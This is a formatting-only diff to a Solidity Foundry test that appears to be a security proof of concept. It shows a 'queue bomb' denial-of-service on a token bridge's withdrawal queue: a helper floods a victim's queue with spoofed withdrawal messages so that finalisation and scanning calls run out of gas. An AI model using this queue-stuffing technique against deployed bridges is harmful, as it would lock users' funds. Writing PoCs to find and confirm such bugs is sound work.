@@ -36,10 +36,7 @@ contract ImxTokenMock is ERC20 {
 contract MockBridgeAdaptor is IRootBridgeAdaptor {
     event Sent(bytes payload, address sender, uint256 value);
 
-    function sendMessage(
-        bytes calldata payload,
-        address refundRecipient
-    ) external payable override {
+    function sendMessage(bytes calldata payload, address refundRecipient) external payable override {
         emit Sent(payload, refundRecipient, msg.value);
     }
 
@@ -75,14 +72,13 @@ contract QueueBombVulnerableTest is Test {
 
         bridge = new RootERC20BridgeFlowRate(initializer);
 
-        IRootERC20Bridge.InitializationRoles memory roles = IRootERC20Bridge
-            .InitializationRoles({
-                defaultAdmin: address(this),
-                pauser: address(this),
-                unpauser: address(this),
-                variableManager: address(this),
-                adaptorManager: address(this)
-            });
+        IRootERC20Bridge.InitializationRoles memory roles = IRootERC20Bridge.InitializationRoles({
+            defaultAdmin: address(this),
+            pauser: address(this),
+            unpauser: address(this),
+            variableManager: address(this),
+            adaptorManager: address(this)
+        });
 
         bridge.initialize(
             roles,
@@ -103,21 +99,10 @@ contract QueueBombVulnerableTest is Test {
         bridge.activateWithdrawalQueue();
     }
 
-    function _stuffQueue(
-        address forReceiver,
-        address token,
-        uint256 count,
-        uint256 amount
-    ) internal {
+    function _stuffQueue(address forReceiver, address token, uint256 count, uint256 amount) internal {
         bytes32 withdrawSig = bridge.WITHDRAW_SIG();
         for (uint256 i = 0; i < count; i++) {
-            bytes memory payload = abi.encode(
-                withdrawSig,
-                token,
-                address(this),
-                forReceiver,
-                amount
-            );
+            bytes memory payload = abi.encode(withdrawSig, token, address(this), forReceiver, amount);
             vm.prank(address(rootBridgeAdaptor));
             bridge.onMessageReceive(payload);
         }
@@ -131,12 +116,10 @@ contract QueueBombVulnerableTest is Test {
         vm.warp(block.timestamp + 2 days);
         console.log("Warped 2 days, aggregating");
         uint256[] memory idx = new uint256[](10);
-        for (uint256 i = 0; i < 10; i++) idx[i] = i;
-        bridge.finaliseQueuedWithdrawalsAggregated(
-            receiver,
-            address(legit),
-            idx
-        );
+        for (uint256 i = 0; i < 10; i++) {
+            idx[i] = i;
+        }
+        bridge.finaliseQueuedWithdrawalsAggregated(receiver, address(legit), idx);
         console.log("Aggregation succeeded (sanity)\n");
     }
 
@@ -149,20 +132,14 @@ contract QueueBombVulnerableTest is Test {
         vm.warp(block.timestamp + 2 days);
         console.log("Warped 2 days, attempting aggregation with 25M gas");
         uint256[] memory idx = new uint256[](big);
-        for (uint256 i = 0; i < big; i++) idx[i] = i;
-        (bool ok, ) = address(bridge).call{gas: 25_000_000}(
-            abi.encodeWithSelector(
-                bridge.finaliseQueuedWithdrawalsAggregated.selector,
-                receiver,
-                address(legit),
-                idx
-            )
+        for (uint256 i = 0; i < big; i++) {
+            idx[i] = i;
+        }
+        (bool ok,) = address(bridge).call{gas: 25_000_000}(
+            abi.encodeWithSelector(bridge.finaliseQueuedWithdrawalsAggregated.selector, receiver, address(legit), idx)
         );
         console.log("Aggregation call returned", ok);
-        assertTrue(
-            ok,
-            "Vulnerable contract should OOG - test will fail (as intended)"
-        );
+        assertTrue(ok, "Vulnerable contract should OOG - test will fail (as intended)");
         console.log("Unexpected success - vulnerability fixed?\n");
     }
 
@@ -177,21 +154,11 @@ contract QueueBombVulnerableTest is Test {
         vm.warp(block.timestamp + 2 days);
         console.log("Warped 2 days, scanning queue with 25M gas");
         uint256 stop = poisonCount + 1;
-        (bool ok, ) = address(bridge).call{gas: 25_000_000}(
-            abi.encodeWithSelector(
-                bridge.findPendingWithdrawals.selector,
-                victim,
-                address(legit),
-                0,
-                stop,
-                10
-            )
+        (bool ok,) = address(bridge).call{gas: 25_000_000}(
+            abi.encodeWithSelector(bridge.findPendingWithdrawals.selector, victim, address(legit), 0, stop, 10)
         );
         console.log("findPendingWithdrawals returned", ok);
-        assertTrue(
-            ok,
-            "Vulnerable contract should OOG - test will fail (as intended)"
-        );
+        assertTrue(ok, "Vulnerable contract should OOG - test will fail (as intended)");
         console.log("Unexpected success - vulnerability fixed?\n");
     }
 }
